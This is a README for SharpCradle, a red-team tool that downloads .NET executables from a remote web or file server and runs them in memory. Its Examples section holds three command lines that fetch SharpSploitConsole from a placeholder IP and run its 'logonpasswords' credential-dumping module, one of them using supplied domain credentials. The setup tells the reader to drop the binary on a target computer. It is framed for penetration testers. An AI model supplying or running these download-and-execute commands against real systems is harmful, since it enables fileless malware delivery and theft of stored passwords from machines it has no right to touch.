# SharpCradle

Description
============

SharpCradle is a tool designed to help penetration testers or red teams download and execute .NET binaries into memory.

Contact at:
- Twitter: @anthemtotheego

**Before submitting issues, this tool may not always be updated actively. I encourage you to borrow, add, mod, and/or make your own.  Remember, all the awesome code out there (and there is a lot) can be taken/modified to create your own custom tools.**

![Alt text](/SCradle.PNG?raw=true "SharpSploitConsole")
![Alt text](/SCradle2.PNG?raw=true "")

Setup - Quick and Dirty
==============================

**Note: For those of you who don't want to go through the trouble of compiling your own I uploaded an x64 and x86 binary found in the CompiledBinaries folder.  For those of you who do want to compile your own... I used Windows 10, Visual Studio 2017 - mileage may vary**

1. Download SharpCradle tool and open up SharpCradle.sln                         

2. Compile, drop binary on target computer and have fun.

Examples 
========

Web Server Download:

```SharpCradle.exe -w https://IP/SharpSploitConsole_x64.exe logonpasswords```

File Server Download Anonymous:

```SharpCradle.exe -f \\IP\share\SharpSploitConsole_x64.exe logonpasswords```

File Server Download With Creds:

```SharpCradle.exe -f -c domain username password \\IP\share\SharpSploitConsole_x64.exe logonpasswords```
